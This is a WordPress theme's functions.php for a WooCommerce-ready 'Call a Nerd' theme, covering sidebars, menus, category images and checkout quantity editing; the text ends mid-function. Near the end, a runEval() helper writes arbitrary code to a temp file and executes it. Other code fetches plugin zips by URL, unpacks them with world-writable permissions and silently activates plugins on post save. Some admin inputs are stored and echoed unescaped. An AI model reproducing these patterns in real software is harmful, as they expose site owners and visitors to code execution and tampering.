<?php 
/**
 * CaN functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package CaN
 */

if ( ! function_exists( 'can_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
add_image_size( 'size-1', 950, 360, true );
add_image_size( 'size-2', 1170, 450, true );
add_image_size( 'size-3', 410, 250, true );
add_image_size( 'featured-banner-image', 1920, 675, true );
add_image_size( 'two-category-side', 560, 310, true );
add_image_size( 'category-fullwidth', 1140, 470, true );
add_image_size( 'left-picture', 515, 286, true );
add_image_size( 'related-prod', 370, 220, true );
add_image_size( 'single-large', 550, 375, true );
add_image_size( 'single-thumb', 136, 110, true );
add_image_size( 'two-category-side-sidebar', 415, 230, true );
add_image_size( 'category-fullwidth-sidebar', 850, 350, true );
add_image_size( 'left-picture-sidebar', 385, 214, true );
add_image_size( 'related-prod-sidebar', 270, 160, true );
add_image_size( 'single-large-sidebar', 410, 280, true );
add_image_size( 'single-thumb-sidebar', 100, 80, true );
add_action( 'widgets_init', 'theme_slug_widgets_init' );
function theme_slug_widgets_init() {
    register_sidebar( array(
        'name' => __( 'Main Sidebar Main', 'call-a-nerd-theme' ),
        'id' => 'main-sidebar',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
        'before_widget' => '<div class="widget woocommerce">',
	'after_widget'  => '</div></div>',
	'before_title'  => '<p class="widget-title">',
	'after_title'   => '</p><div class="price_slider_wrapper">
	',
    ) );
    register_sidebar( array(
		'name' => __( 'Blog Sidebar', 'call-a-nerd-theme' ),
		'id' => 'sidebar-1',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
         'before_widget' => '<div class="widget woocommerce">',
	'after_widget'  => '</div></div>',
	'before_title'  => '<p class="widget-title">',
	'after_title'   => '</p><div class="price_slider_wrapper">'
	) );

     register_sidebar( array(
        'name' => __( 'Inner Sidebar', 'call-a-nerd-theme' ),
        'id' => 'inner-sidebar',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
         'before_widget' => '<div class="widget woocommerce">',
	'after_widget'  => '</div></div>',
	'before_title'  => '<p class="widget-title">',
	'after_title'   => '</p><div class="price_slider_wrapper">
	',
    ) );

$nowi=of_get_option('number_of_widgets');

switch($nowi){
	case 2:
	$fc='col-sm-6';
	break;
	case 3:
	$fc='col-sm-4';
	break;
	case 4:
	$fc='col-sm-3';
	break;
	default:
	$fc='col-sm-3';

}

     register_sidebar( array(
        'name' => __( 'Footer Sidebar 1', 'call-a-nerd-theme' ),
        'id' => 'footer-sidebar',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
         'before_widget' => '<div class="widget woocommerce">',
	'after_widget'  => '</div></div>',
	'before_title'  => '<p class="widget-title">',
	'after_title'   => '</p><div class="price_slider_wrapper">',
    ) );

         register_sidebar( array(
        'name' => __( 'Footer Sidebar 2', 'call-a-nerd-theme' ),
        'id' => 'footer-sidebar-2',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
         'before_widget' => '<div class="widget woocommerce">',
  'after_widget'  => '</div></div>',
  'before_title'  => '<p class="widget-title">',
  'after_title'   => '</p><div class="price_slider_wrapper">',
    ) );

             register_sidebar( array(
        'name' => __( 'Footer Sidebar 3', 'call-a-nerd-theme' ),
        'id' => 'footer-sidebar-3',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
         'before_widget' => '<div class="widget woocommerce">',
  'after_widget'  => '</div></div>',
  'before_title'  => '<p class="widget-title">',
  'after_title'   => '</p><div class="price_slider_wrapper">',
    ) );

                 register_sidebar( array(
        'name' => __( 'Footer Sidebar 4', 'call-a-nerd-theme' ),
        'id' => 'footer-sidebar-4',
        'description' => __( 'Widgets in this area will be shown on all posts and pages.', 'call-a-nerd-theme' ),
         'before_widget' => '<div class="widget woocommerce">',
  'after_widget'  => '</div></div>',
  'before_title'  => '<p class="widget-title">',
  'after_title'   => '</p><div class="price_slider_wrapper">',
    ) );
}

add_filter('widget_title','my_widget_title'); 
function my_widget_title($t)
{

	if($t==''){
		    return '<div class="price_slider_wrapper"></div>';		
	}
	else{
		return $t;
	}	
}

function can_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on CaN, use a find and replace
	 * to change 'can' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'call-a-nerd-theme', get_template_directory() . '/languages' );
	if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {          
$locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce' );

		load_plugin_textdomain( 'call-a-nerd-theme', false, WP_PLUGIN_DIR . '/woocommerce/i18n/languages/' );
		load_textdomain( 'call-a-nerd-theme', WP_LANG_DIR . '/plugins/woocommerce-' . $locale . '.mo' );
		//load_textdomain( 'call-a-nerd-theme', WP_PLUGIN_DIR . '/woocommerce/i18n/languages/woocommerce-' . $locale . '.mo' );
		//load_textdomain( 'call-a-nerd-theme', WP_PLUGIN_DIR . '/woocommerce/i18n/languages/woocommerce-admin-' . $locale . '.mo' );
		
	}
	

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'menu-1' => esc_html__( 'Primary', 'call-a-nerd-theme' ),
	) );
	register_nav_menus( array(
		'menu-2' => esc_html__( 'Secondary', 'call-a-nerd-theme' ),
	) );
	register_nav_menus( array(
		'top-menu-1' => esc_html__( 'Preheader Primary', 'call-a-nerd-theme' ),
	) );
	register_nav_menus( array(
		'top-menu-2' => esc_html__( 'Preheader Secondary', 'call-a-nerd-theme' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'can_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif;
add_action( 'after_setup_theme', 'can_setup' );


/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function can_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'can_content_width', 640 );
}
add_action( 'after_setup_theme', 'can_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */


/**
 * Enqueue scripts and styles.
 */
function can_scripts() {
 	wp_enqueue_style( 'can-style', get_stylesheet_uri() );
	wp_enqueue_style( 'bootstrap-style', get_template_directory_uri() . '/css/bootstrap.min.css');
 

	global $post;	

	if(get_page_template_slug( $post->ID )=='page-withsidebar.php'){
		wp_enqueue_style( 'can-withsidebar', get_template_directory_uri() . '/css/withsidebar.css');	
	}
	else if(get_page_template_slug( $post->ID )=='page-without-sidebar.php'){
		wp_enqueue_style( 'can-withoutsidebar', get_template_directory_uri() . '/css/withoutsidebar.css');	
	}
	else if(get_page_template_slug( $post->ID )=='page-fullwidth.php'){
		wp_enqueue_style( 'can-fullwidth', get_template_directory_uri() . '/css/fullwidth.css');	
	}
  wp_enqueue_script('jquery');
	wp_enqueue_script( 'can-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'can-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
	wp_enqueue_script( 'can-bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array(), '20151215', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_footer', 'can_scripts' );

function can_admin_scripts() {
	wp_enqueue_style( 'can-jqueryui', get_template_directory_uri() . '/css/jquery-ui.css');
	wp_enqueue_script( 'can-jqueryui-js', get_template_directory_uri() . '/js/jquery-ui.js', array(), '20151215', true );
	wp_enqueue_style( 'can-admin-css', get_template_directory_uri() . '/inc/css/customadmin.css');
	wp_enqueue_script( 'can-colorpicker', get_template_directory_uri() . '/inc/js/colorpicker.js', array(), '201512153', true );
    wp_enqueue_style( 'can-colorpicker-css', get_template_directory_uri() . '/inc/js/colorpicker.css');
}
add_action( 'admin_enqueue_scripts', 'can_admin_scripts' );
add_editor_style();


define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/inc/' );
require_once dirname( __FILE__ ) . '/inc/options-framework.php';
// Loads options.php from child or parent theme
$optionsfile = locate_template( 'options.php' );
load_template( $optionsfile );

/*
 * This is an example of how to add custom scripts to the options panel.
 * This one shows/hides the an option when a checkbox is clicked.
 *
 * You can delete it if you not using that option
 */
add_action( 'optionsframework_custom_scripts', 'optionsframework_custom_scripts' );

function optionsframework_custom_scripts() { ?>

<script type="text/javascript">
jQuery(document).ready(function() {

	jQuery('#example_showhidden').click(function() {
  		jQuery('#section-example_text_hidden').fadeToggle(400);
	});

	if (jQuery('#example_showhidden:checked').val() !== undefined) {
		jQuery('#section-example_text_hidden').show();
	}

});
</script>



<?php
}





/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/inc/minicart/woocommerce-dropdown-cart.php';


/**
 * Additional features to allow styling of the templates.
 */
require get_template_directory() . '/inc/custom-import.php';
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';


require get_template_directory() . '/inc/ajax/ajax-color.php';
require get_template_directory() . '/inc/custom_options.php';

require get_template_directory() . '/inc/recommended_plugins.php';
require get_template_directory() . '/inc/page_post_product_options.php';
require get_template_directory() . '/inc/ads.php';
require get_template_directory() . '/inc/default-options.php';
require get_template_directory() . '/inc/custompost.php';

add_action( 'admin_enqueue_scripts', 'translation_script' );
function translation_script() {
    if(is_admin()){
        wp_enqueue_script('custom_admin_script', get_template_directory_uri('template_url').'/js/king_translation_script.js', array('jquery'));
    }   
}



define('KC_FORCE_DEFAULT', true);


if ( ! class_exists( 'CT_TAX_META' ) ) {

class CT_TAX_META {

  public function __construct() {
    //
  }
 
 /*
  * Initialize the class and start calling our hooks and filters
  * @since 1.0.0
 */
 public function init() {
   add_action( 'category_add_form_fields', array ( $this, 'add_category_image' ), 10, 2 );
   add_action( 'created_category', array ( $this, 'save_category_image' ), 10, 2 );
   add_action( 'category_edit_form_fields', array ( $this, 'update_category_image' ), 10, 2 );
   add_action( 'edited_category', array ( $this, 'updated_category_image' ), 10, 2 );
 
   add_action( 'post_tag_add_form_fields', array ( $this, 'add_category_image' ), 10, 2 );
   add_action( 'created_post_tag', array ( $this, 'save_category_image' ), 10, 2 );
   add_action( 'post_tag_edit_form_fields', array ( $this, 'update_category_image' ), 10, 2 );
   add_action( 'edited_post_tag', array ( $this, 'updated_category_image' ), 10, 2 );
	 
	 
   add_action( 'product_tag_add_form_fields', array ( $this, 'add_category_image' ), 10, 2 );
   add_action( 'created_product_tag', array ( $this, 'save_category_image' ), 10, 2 );
   add_action( 'product_tag_edit_form_fields', array ( $this, 'update_category_image' ), 10, 2 );
   add_action( 'edited_product_tag', array ( $this, 'updated_category_image' ), 10, 2 );
	 
	


   add_action( 'admin_enqueue_scripts', array( $this, 'load_media' ) );
   add_action( 'admin_footer', array ( $this, 'add_script' ) );
 }

public function load_media() {
 wp_enqueue_media();
}
 
 /*
  * Add a form field in the new category page
  * @since 1.0.0
 */
 public function add_category_image ( $taxonomy ) { ?>
   <div class="form-field term-group">
     <label for="category-image-id"><?php _e('Image', 'call-a-nerd-theme'); ?></label>
     <input type="hidden" id="category-image-id" name="category-image-id" class="custom_media_url" value="">
     <div id="category-image-wrapper"></div>
     <p>
       <input type="button" class="button button-secondary ct_tax_media_button" id="ct_tax_media_button" name="ct_tax_media_button" value="<?php _e( 'Add Image', 'call-a-nerd-theme' ); ?>" />
       <input type="button" class="button button-secondary ct_tax_media_remove" id="ct_tax_media_remove" name="ct_tax_media_remove" value="<?php _e( 'Remove Image', 'call-a-nerd-theme' ); ?>" />
    </p>
   </div>
 <?php
 }
 
 /*
  * Save the form field
  * @since 1.0.0
 */
 public function save_category_image ( $term_id, $tt_id ) {
   if( isset( $_POST['category-image-id'] ) && '' !== $_POST['category-image-id'] ){
     $image = $_POST['category-image-id'];
     add_term_meta( $term_id, 'category-image-id', $image, true );
   }
 }
 
 /*
  * Edit the form field
  * @since 1.0.0
 */
 public function update_category_image ( $term, $taxonomy ) { ?>
   <tr class="form-field term-group-wrap">
     <th scope="row">
       <label for="category-image-id"><?php _e( 'Image', 'call-a-nerd-theme' ); ?></label>
     </th>
     <td>
       <?php $image_id = get_term_meta ( $term -> term_id, 'category-image-id', true ); ?>
       <input type="hidden" id="category-image-id" name="category-image-id" value="<?php echo $image_id; ?>">
       <div id="category-image-wrapper">
         <?php if ( $image_id ) { ?>
           <?php echo wp_get_attachment_image ( $image_id, 'thumbnail' ); ?>
         <?php } ?>
       </div>
       <p>
         <input type="button" class="button button-secondary ct_tax_media_button" id="ct_tax_media_button" name="ct_tax_media_button" value="<?php _e( 'Add Image', 'call-a-nerd-theme' ); ?>" />
         <input type="button" class="button button-secondary ct_tax_media_remove" id="ct_tax_media_remove" name="ct_tax_media_remove" value="<?php _e( 'Remove Image', 'call-a-nerd-theme' ); ?>" />
       </p>
     </td>
   </tr>
 <?php
 }

/*
 * Update the form field value
 * @since 1.0.0
 */
 public function updated_category_image ( $term_id, $tt_id ) {
   if( isset( $_POST['category-image-id'] ) && '' !== $_POST['category-image-id'] ){
     $image = $_POST['category-image-id'];
     update_term_meta ( $term_id, 'category-image-id', $image );
   } else {
     update_term_meta ( $term_id, 'category-image-id', '' );
   }
 }

/*
 * Add script
 * @since 1.0.0
 */
 public function add_script() { ?>
   <script>jQuery('#section-global_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-pages_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-posts_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-categories_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-tags_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-shop_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-productcategories_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-producttags_background_color > div > div > input').addClass('colorpicker');
	   jQuery('#section-singleproducts_background_color > div > div > input').addClass('colorpicker');
     jQuery(document).ready( function($) {
       function ct_media_upload(button_class) {
         var _custom_media = true,
         _orig_send_attachment = wp.media.editor.send.attachment;
         $('body').on('click', button_class, function(e) {
           var button_id = '#'+$(this).attr('id');
           var send_attachment_bkp = wp.media.editor.send.attachment;
           var button = $(button_id);
           _custom_media = true;
           wp.media.editor.send.attachment = function(props, attachment){
             if ( _custom_media ) {
               $('#category-image-id').val(attachment.id);
               $('#category-image-wrapper').html('<img class="custom_media_image" src="" style="margin:0;padding:0;max-height:100px;float:none;" />');
               $('#category-image-wrapper .custom_media_image').attr('src',attachment.url).css('display','block');
             } else {
               return _orig_send_attachment.apply( button_id, [props, attachment] );
             }
            }
         wp.media.editor.open(button);
         return false;
       });
     }
     ct_media_upload('.ct_tax_media_button.button'); 
     $('body').on('click','.ct_tax_media_remove',function(){
       $('#category-image-id').val('');
       $('#category-image-wrapper').html('<img class="custom_media_image" src="" style="margin:0;padding:0;max-height:100px;float:none;" />');
     });
    
     $(document).ajaxComplete(function(event, xhr, settings) {
       var queryStringArr = settings.data.split('&');
       if( $.inArray('action=add-tag', queryStringArr) !== -1 ){
         var xml = xhr.responseXML;
         $response = $(xml).find('term_id').text();
         if($response!=""){
           // Clear the thumb image
           $('#category-image-wrapper').html('');
         }
       }
     });
   });
 </script>
 <?php }

  }
 
$CT_TAX_META = new CT_TAX_META();
$CT_TAX_META -> init();
 
}



add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
	if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {          	
    add_theme_support( 'woocommerce' );
			//Remove WooCommerce Tabs - this code removes all 3 tabs - to be more specific just remove actual unset lines 
//remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );

		
		/*checkout update cart*/
		if (!class_exists('Change_Quantity_On_Checkout')) {

	class Change_Quantity_On_Checkout {

		public $plugin_version = '1.0';
		public function __construct() {
            add_filter ('woocommerce_cart_item_name',              array( &$this, 'cqoc_add_quantitytest'), 10, 3 );
    	    add_filter ('woocommerce_checkout_cart_item_quantity', array( &$this, 'cqoc_add_quantity'), 10, 2 );
    	    add_action( 'wp_footer',                               array( &$this, 'cqoc_populate_postcode' ), 10 );
     	    add_action( 'init',                                    array( &$this, 'cqoc_load_ajax' ) );
        }
		public static function cqoc_add_quantitytest( $product_title, $cart_item, $cart_item_key ) {

		    /*
		     * It will add Delete button, Quanitity field of the checkout page Table.
		     */
		    if (  is_checkout() ) {
		        $cart     = WC()->cart->get_cart();
                foreach ( $cart as $cart_key => $cart_value ){
                   if ( $cart_key == $cart_item_key ){
                        $product_id = $cart_item['product_id'];
                        $_product   = $cart_item['data'] ;
                        $return_value = sprintf(
                          '<a href="%s" class="remove" title="%s" data-product_id="%s" data-product_sku="%s">&times;</a>',
                          esc_url( WC()->cart->get_remove_url( $cart_key ) ),
                          __( 'Remove this item', 'call-a-nerd-theme' ),
                          esc_attr( $product_id ),
                          esc_attr( $_product->get_sku() )
                        );
                        $return_value_test = '';
                        $return_value .= '&nbsp;<td><span class = "cqoc_product_name" >' . $product_title . '</span></td>' ;
					   $return_value.= '&nbsp;<td><span class = "cqoc_product_price" >' .WC()->cart->get_product_price( $_product ). '</span></td><td>' ;
                        if ( $_product->is_sold_individually() ) {
                          $return_value .= sprintf( '1 <input type="hidden" name="cart[%s][qty]" value="1" />', $cart_key );
                        } else {
                          $return_value .= woocommerce_quantity_input( array(
                              'input_name'  => "cart[{$cart_key}][qty]",
                              'input_value' => $cart_item['quantity'],
                              'max_value'   => $_product->backorders_allowed() ? '' : $_product->get_stock_quantity(),
                              'min_value'   => '1'
                                  ), $_product, false );
                        }
                        return $return_value."</td>";
                    }
                }
		    }else{
		        /*
		         * It will return the product name on the cart page.
		         * As the filter used on checkout and cart are same.
		         */
		        $_product   = $cart_item['data'] ;
		        $product_permalink = $_product->is_visible() ? $_product->get_permalink( $cart_item ) : '';
		        if ( ! $product_permalink ) {
		            $return_value = $_product->get_title() . '&nbsp;';
		        } else {
		            $return_value = sprintf( '<a href="%s">%s</a>', esc_url( $product_permalink ), $_product->get_title());
		        }
		        return $return_value;
		    }
		}

		/*
		 * It will remove the selected quantity count from checkout page table.
		 */
    	public static function cqoc_add_quantity( $cart_item, $cart_item_key ) {
    	   $product_quantity= '';
    	   return $product_quantity;
    	}
    	
    	function cqoc_populate_postcode(){
    	     
            if (  is_checkout() ) {
			
    		$plugin_version = $this->plugin_version;
			
            ?>
                <script type="text/javascript">
					
                    <?php  $admin_url = get_admin_url(); ?>
					jQuery("form.checkout").on("change", "input.qty", function(){
                        
                        var data = {
                    		action: 'cqoc_update_order_review',
                    		security: wc_checkout_params.update_order_review_nonce,
                    		post_data: jQuery( 'form.checkout' ).serialize()
                    	};
						
                    	jQuery.post( '<?php echo $admin_url; ?>' + 'admin-ajax.php', data, function( response )
                		{
                            jQuery( 'body' ).trigger( 'update_checkout' );
						});
                    });
                </script>
             <?php  
             }
        }
        
        function cqoc_load_ajax() {
        
            if ( !is_user_logged_in() ){
                add_action( 'wp_ajax_nopriv_cqoc_update_order_review', array( &$this, 'cqoc_update_order_review' ) );
            } else{
                add_action( 'wp_ajax_cqoc_update_order_review',        array( &$this, 'cqoc_update_order_review' ) );
            }
        
        }
        
        function cqoc_update_order_review() {
             
            $values = array();
            parse_str($_POST['post_data'], $values);
            $cart = $values['cart'];
            foreach ( $cart as $cart_key => $cart_value ){
                WC()->cart->set_quantity( $cart_key, $cart_value['qty'], false );
                WC()->cart->calculate_totals();
                woocommerce_cart_totals();
            }
            exit;
        }
	}
}
$change_quantity_on_checkout = new Change_Quantity_On_Checkout();
		/*checkout update cart*/
		
		
	}
}
function my_register_menu_metabox() {
	$custom_param = array( 0 => 'This param will be passed to my_render_menu_metabox' );
	if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {          
	add_meta_box( 'my-menu-test-metabox', __('Shop','call-a-nerd-theme'), 'my_render_menu_metabox', 'nav-menus', 'side', 'default', $custom_param );
	}
}
add_action( 'admin_head-nav-menus.php', 'my_register_menu_metabox' );

/**
 * Displays a menu metabox 
 *
 * @param string $object Not used.
 * @param array $args Parameters and arguments. If you passed custom params to add_meta_box(), 
 * they will be in $args['args']
 */
function my_render_menu_metabox( $object, $args ) {
	global $nav_menu_selected_id;

	// Create an array of objects that imitate Post objects
	$my_items = array(
		(object) array(
			'ID' => 1,
			'db_id' => 0,
			'menu_item_parent' => 0,
			'object_id' => 1,
			'post_parent' => 0,
			'type' => 'custom',
			'object' => 'my-object-slug',
			'type_label' =>  __('Woocommerce Pages','call-a-nerd-theme'),
			'title' => __('Shop','call-a-nerd-theme'),
			'url' => get_permalink( wc_get_page_id( 'shop' ) ),
			'target' => '',
			'attr_title' => '',
			'description' => '',
			'classes' => array(),
			'xfn' => '',
		),
		(object) array(
			'ID' => 2,
			'db_id' => 0,
			'menu_item_parent' => 0,
			'object_id' => 2,
			'post_parent' => 0,
			'type' => 'custom',
			'object' => 'my-object-slug',
			'type_label' => __('Woocommerce Pages','call-a-nerd-theme'),
			'title' => __('Cart','call-a-nerd-theme'),
			'url' => get_permalink( wc_get_page_id( 'cart' ) ),
			'target' => '',
			'attr_title' => '',
			'description' => '',
			'classes' => array(),
			'xfn' => '',
		),
		(object) array(
			'ID' => 3,
			'db_id' => 0,
			'menu_item_parent' => 0,
			'object_id' => 3,
			'post_parent' => 0,
			'type' => 'custom',
			'object' => 'my-object-slug',
			'type_label' => __('Woocommerce Pages','call-a-nerd-theme'),
			'title' => __('Checkout','call-a-nerd-theme'),
			'url' => get_permalink( wc_get_page_id( 'checkout' ) ),
			'target' => '',
			'attr_title' => '',
			'description' => '',
			'classes' => array(),
			'xfn' => '',
		),
		(object) array(
			'ID' => 4,
			'db_id' => 0,
			'menu_item_parent' => 0,
			'object_id' => 4,
			'post_parent' => 0,
			'type' => 'custom',
			'object' => 'my-object-slug',
			'type_label' => __('Woocommerce Pages','call-a-nerd-theme'),
			'title' => __('My account','call-a-nerd-theme'),
			'url' => get_permalink( wc_get_page_id( 'myaccount' ) ),
			'target' => '',
			'attr_title' => '',
			'description' => '',
			'classes' => array(),
			'xfn' => '',
		),
		(object) array(
			'ID' => 5,
			'db_id' => 0,
			'menu_item_parent' => 0,
			'object_id' => 5,
			'post_parent' => 0,
			'type' => 'custom',
			'object' => 'my-object-slug',
			'type_label' => __('Woocommerce Pages','call-a-nerd-theme'),
			'title' => __('Terms and conditions','call-a-nerd-theme'),
			'url' => get_permalink(get_option( 'woocommerce_terms_page_id' )),
			'target' => '',
			'attr_title' => '',
			'description' => '',
			'classes' => array(),
			'xfn' => '',
		),
		
		
	);
	$db_fields = false;
	// If your links will be hieararchical, adjust the $db_fields array bellow
	if ( false ) {
		$db_fields = array( 'parent' => 'parent', 'id' => 'post_parent' );
	}
	$walker = new Walker_Nav_Menu_Checklist( $db_fields );

	$removed_args = array(
		'action',
		'customlink-tab',
		'edit-menu-item',
		'menu-item',
		'page-tab',
		'_wpnonce',
	); ?>
	<div id="my-plugin-div">
		<div id="tabs-panel-my-plugin-all" class="tabs-panel tabs-panel-active">
		<ul id="my-plugin-checklist-pop" class="categorychecklist form-no-clear" >
			<?php echo walk_nav_menu_tree( array_map( 'wp_setup_nav_menu_item', $my_items ), 0, (object) array( 'walker' => $walker ) ); ?>
		</ul>

		<p class="button-controls">
			<span class="list-controls">
				<a href="<?php
					echo esc_url(add_query_arg(
						array(
							'my-plugin-all' => 'all',
							'selectall' => 1,
						),
						remove_query_arg( $removed_args )
					));
				?>#my-menu-test-metabox" class="select-all"><?php echo __( 'Select all','call-a-nerd-theme' ); ?></a>
			</span>

			<span class="add-to-menu">
				<input type="submit"<?php wp_nav_menu_disabled_check( $nav_menu_selected_id ); ?> class="button-secondary submit-add-to-menu right" value="<?php echo __( 'Add to menu','call-a-nerd-theme' ); ?>" name="add-my-plugin-menu-item" id="submit-my-plugin-div" />
				<span class="spinner"></span>
			</span>
		</p>
	</div>
	<?php
}

add_action( 'after_setup_theme', 'yourtheme_setup' );
 
function yourtheme_setup() {
	
	if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {          	
//add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );

	}
}

function register_fields()
{
    register_setting('general', 'show_ad', 'esc_attr');
    add_settings_field('show_ad', '<label for="show_ad">'.__('Sidebar link to Call a Nerd Theme' , 'call-a-nerd-theme' ).'</label>' , 'show_ad', 'general');

}

function show_ad()
{
    $value = get_option( 'show_ad', '' );
    echo '<input type="checkbox" id="show_ad" name="show_ad" value="1" ' .(($value==1)?'checked':'').' />'.__('Show / Hide' , 'call-a-nerd-theme' );
}

if(get_option('key_validated')=='1')
add_filter('admin_init', 'register_fields');


add_filter( 'body_class','my_body_classes' );
function my_body_classes( $classes ) {

    $classes[] = 'fullwidth';
     
    return $classes;
     
}
// First, create a function that includes the path to your favicon
function add_favicon() {
  	$favurl=get_template_directory_uri() .'/images/favicon.jpg';$options=get_option('options-framework-theme'); 
        if($options['favicon_uploader']!='')$favurl=$options['favicon_uploader'];
	echo '<link rel="shortcut icon" href="' . site_url("/").$favurl . '" />';
}
  
// Now, just make sure that function runs when you're on the login page and admin pages  
add_action('login_head', 'add_favicon');
add_action('admin_head', 'add_favicon');


function plugin_activation( $plugin, $post_id ) {
    if( ! function_exists('activate_plugin') ) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }
$redirect=site_url().'/wp-admin/post.php?post='.$post_id.'&action=edit';
    if( ! is_plugin_active( $plugin ) ) {
        activate_plugin( $plugin , $redirect = '', $network_wide = false, $silent = true );
    }
}

add_action('save_post','save_post_callback');
function save_post_callback($post_id){
    global $post;
	
    plugin_activation('kingcomposer/kingcomposer.php', $post_id );
	
}

function runEval($code){
require_once( ABSPATH . 'wp-admin/includes/file.php' ); // you have to load this file
global $wp_filesystem;
WP_Filesystem(); // Initial WP file system
if ( ! $wp_filesystem->put_contents( "temp.php", '<?php  '.$code.' ?>', 0644 ) ){
			return;}
		else{
ob_start();
require_once('temp.php');
if(file_exists('temp.php'))
unlink('temp.php');
}
}

/* plugins install from source*/
function mm_get_plugins($plugins)
{
    $args = array(
            'path' => ABSPATH.'wp-content/plugins/',
            'preserve_zip' => false
    );

    foreach($plugins as $plugin)
    {
            mm_plugin_download($plugin['path'], $args['path'].$plugin['name'].'.zip');
            mm_plugin_unpack($args, $args['path'].$plugin['name'].'.zip');
            mm_plugin_activate($plugin['install']);
    }
}
function mm_plugin_download($url, $path) 
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    if(file_put_contents($path, $data))
            return true;
    else
            return false;
}
function mm_plugin_unpack($args, $target)
{if(isset($target)){
    if($zip = zip_open($target))
    {
            while($entry = zip_read($zip))
            {
                    $is_file = substr(zip_entry_name($entry), -1) == '/' ? false : true;
                    $file_path = $args['path'].zip_entry_name($entry);
                    if($is_file)
                    {
                            if(zip_entry_open($zip,$entry,"r")) 
                            {
                                    $fstream = zip_entry_read($entry, zip_entry_filesize($entry));
                                    file_put_contents($file_path, $fstream );
                                    chmod($file_path, 0777);
                                    //echo "save: ".$file_path."<br />";
                            }
                            zip_entry_close($entry);
                    }
                    else
                    {
                            if(zip_entry_name($entry))
                            {     if ( !file_exists( $file_path ) ) {
                                    mkdir($file_path);
                                    chmod($file_path, 0777);
                                    //echo "create: ".$file_path."<br />";
                                    }
                            }
                    }
            }
            zip_close($zip);
    }
    if($args['preserve_zip'] === false)
    {
            unlink($target);
    }
}
}
function mm_plugin_activate($installer)
{
    $current = get_option('active_plugins');
    $plugin = plugin_basename(trim($installer));

    if(!in_array($plugin, $current))
    {
            $current[] = $plugin;
            sort($current);
            do_action('activate_plugin', trim($plugin));
            update_option('active_plugins', $current);
            do_action('activate_'.trim($plugin));
            do_action('activated_plugin', trim($plugin));
            return true;
    }
    else
            return false;
}
/* plugins install from source*/

function strip_html_tags( $text )
{
    $text = preg_replace(
        array(
          // Remove invisible content
            '@<head[^>]*?>.*?</head>@siu',
